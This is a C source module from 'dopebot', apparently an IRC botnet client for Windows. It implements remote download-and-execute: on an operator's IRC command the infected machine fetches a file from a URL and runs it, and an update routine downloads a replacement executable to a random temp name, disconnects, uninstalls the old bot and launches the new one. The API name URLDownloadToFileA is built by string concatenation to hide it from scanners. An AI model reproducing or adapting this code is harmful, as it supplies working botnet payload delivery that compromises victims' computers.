/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef NO_DOWNLOAD
#include "bot.h"

//Download File
DWORD WINAPI download_file(LPVOID param)
{
	char szBuffer[IRCBUF];
	download dlf = *((download *)param);

#ifndef NO_DEBUG
		printf("[DEBUG] Downloading file, download_file()...\n");
#endif

	if (xURLDownloadToFile(dlf.szUrl, dlf.szDestination) == S_OK)
	{
		if (dlf.bRun)
		{
				open_file(dlf.szDestination);
				sprintf(szBuffer, "[DOWNLOAD] file downloaded to: %s [executed].", dlf.szDestination);
				irc_msg(dlf.bsock, dlf.szAction, dlf.szChannel, szBuffer);
		}
		else
		{
				sprintf(szBuffer, "[DOWNLOAD] file downloaded: %s [not executed].", dlf.szDestination);
				irc_msg(dlf.bsock, dlf.szAction, dlf.szChannel, szBuffer);
		}
	}
	else irc_msg(dlf.bsock, dlf.szAction, dlf.szChannel, "[DOWNLOAD] bad address or dns or file already exists.");
		return 0;
}

//Update File
DWORD WINAPI update_file(LPVOID param)
{
	char szBuffer[IRCBUF], szFilePath[MAX_PATH], szTempDir[MAX_PATH];
	update upd = *((update *)param);

#ifndef NO_DEBUG
		printf("[DEBUG] Updating file, update_file()...\n");
#endif

			srand(GetTickCount());
			GetTempPath(sizeof(szTempDir), szTempDir);
			sprintf(szFilePath, "%s%i.tmp.exe", szTempDir, rand()%9999);
	if (xURLDownloadToFile(upd.szUrl, szFilePath) == S_OK)
	{
			sprintf(szBuffer, "[UPDATE] file downloaded to: %s! Updating...", szFilePath);
			irc_msg(upd.bsock, upd.szAction, upd.szChannel, szBuffer);
			sprintf(szBuffer, ":bye..");
			irc_action(upd.bsock, "QUIT", szBuffer);
			irc_disconnect(upd.bsock, upd.event);
		if (uninstall_bot(FALSE))
		{
				execute_file(szFilePath, 0);
				ExitProcess(0);
		}			
	}
	else irc_msg(upd.bsock, upd.szAction, upd.szChannel, "[UPDATE] bad address or dns or file already exists!");
		return 0;
}

//URLDownloadToFile Caller
HRESULT xURLDownloadToFile(char *szURL, char *szFileName)
{
	char szComplete[17] = "URLDown";
	HMODULE hUrl;
	HRESULT h;
	typedef HRESULT (__stdcall *UDTF)(DWORD, LPCSTR, LPCSTR, DWORD, DWORD);
	UDTF fURLDownloadToFile;

#ifndef NO_DEBUG
		printf("[DEBUG] Calling URLDownloadToFile, xURLDownloadToFile()...\n");
#endif

		strcat(szComplete, "loadToFileA");
		hUrl = LoadLibrary("urlmon.dll");
		fURLDownloadToFile = (UDTF)GetProcAddress(hUrl, szComplete);
		h = fURLDownloadToFile(0, szURL, szFileName, 0, 0);
		return h;
}
#endif